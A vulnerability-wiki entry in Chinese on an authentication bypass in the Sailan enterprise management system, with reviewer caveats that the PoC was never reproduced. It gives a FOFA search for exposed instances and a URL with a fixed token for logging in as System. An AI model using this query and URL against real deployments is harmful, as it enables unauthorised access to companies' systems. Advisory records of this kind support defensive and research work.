---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "赛蓝企业管理系统 AuthToken/Index认证绕过"
product: "赛蓝企业管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，固定token有效性机制未知"
prerequisites: "声明匿名以System登录"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%B5%9B%E8%93%9D/%E8%B5%9B%E8%93%9D%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20AuthTokenIndex%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"www.cailsoft.com\" || body=\"赛蓝企业管理系统\""
fofa_unverified: "body="
id: "vw-463d4ae238badac506fdbeaf"
entity_id: "ve-463d4ae238badac506fdbeaf"
schema_version: "1"
---

# 赛蓝企业管理系统 AuthToken/Index认证绕过

## 条目说明

- 对象与具体问题：赛蓝企业管理系统；AuthToken/Index认证绕过
- 版本、配置及部署条件：版本未知，固定token有效性机制未知
- 认证与权限前提：声明匿名以System登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 给一个静态token不解释生成/硬编码机制，不能据此称攻击者可构造任意token
- 没有登录响应或受保护资源证明，超级管理员System角色需证据
- 令牌性质未知，不能当作通用凭据；在野/修复均无来源
- 标题AuthTokenIndex丢路径斜杠；可归企业ERP产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

材料给出了赛蓝企业管理系统 AuthToken/Index 接口和一个固定 token，但没有解释 token 的产生、校验或硬编码机制，也没有登录响应。该示例不足以证明任意攻击者可构造令牌或获得超级管理员权限；相关结论待源码和鉴权对照确认。

影响版本

赛蓝企业管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="www.cailsoft.com" || body="赛蓝企业管理系统"

POC/EXP：

直接访问：/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f

登录后台




## 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
